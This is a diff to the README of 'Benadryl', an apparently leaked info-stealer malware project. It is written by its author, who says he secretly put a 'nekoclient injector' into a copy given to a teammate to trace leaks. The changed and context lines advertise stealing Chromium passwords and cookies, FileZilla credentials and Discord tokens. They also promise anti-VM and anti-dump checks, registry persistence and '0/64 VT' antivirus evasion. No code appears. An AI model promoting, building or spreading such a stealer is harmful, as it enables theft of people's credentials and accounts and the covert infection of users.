@@ -1,6 +1,6 @@
 # Benadryl
 "Benadryl" is a project I made back in June (I'm elpapu writing this). Many users were involved in the development, such as pathos, vii, ablue and wok1337. It contains a lot of features, and a lot of work has been put into it. The source code is going public because a member of the development team decided to leak it, so I'll just ask Aqua to upload it for me before the user leaks it.
-
+Note: this is a version that was given to wok, I dragged nekoclient injector to It just to make sure wok wasn't going to leak nothing, I did It to keep track so If someone leaked It I knew It was wok because I was the only one who gave him the neko version, this source got the neko client part removed so It can be enjoyable. eventually It was leaked to snrios and then we decided to make the source public
 
 ## Features
 ### Stealer
@@ -30,6 +30,7 @@
 - FileZilla
 ### Additional
 - AntiDump & AntiVM
+- Chromium pass & Cookie Stealer
 - Registry Persistence
 - Validates found discord tokens before sending
 - 0/64 VT 
